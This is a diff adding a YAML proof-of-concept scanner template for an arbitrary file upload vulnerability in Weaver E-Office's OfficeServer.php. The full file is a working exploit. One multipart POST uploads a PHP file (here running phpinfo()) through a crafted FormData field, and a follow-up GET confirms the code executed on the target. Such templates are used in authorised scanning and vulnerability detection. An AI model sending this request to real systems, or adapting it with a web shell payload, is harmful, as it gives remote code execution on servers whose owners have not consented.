@@ -1,0 +1,55 @@
+id: poc-yaml-weaver-e-office-OfficeServer-php-file-upload
+
+info:
+  name: 泛微OA E-Office OfficeServer.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    泛微OA E-Office OfficeServer.php 任意文件上传漏洞 allows arbitrary file upload which can lead to remote code execution.
+
+variables:
+  t1: "{{rand_int(1,1000)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
+    body: |
+      ------WebKitFormBoundaryLpoiBFy4ANA8daew
+      Content-Disposition: form-data; name="FileData"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php
+      phpinfo();
+      ?>
+
+      ------WebKitFormBoundaryLpoiBFy4ANA8daew
+      Content-Disposition: form-data; name="FormData"
+
+      {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{t1}}.php'}
+      ------WebKitFormBoundaryLpoiBFy4ANA8daew--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/Document/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "PHP Version"
+          - "PHP API"
+          - "Debug Build"
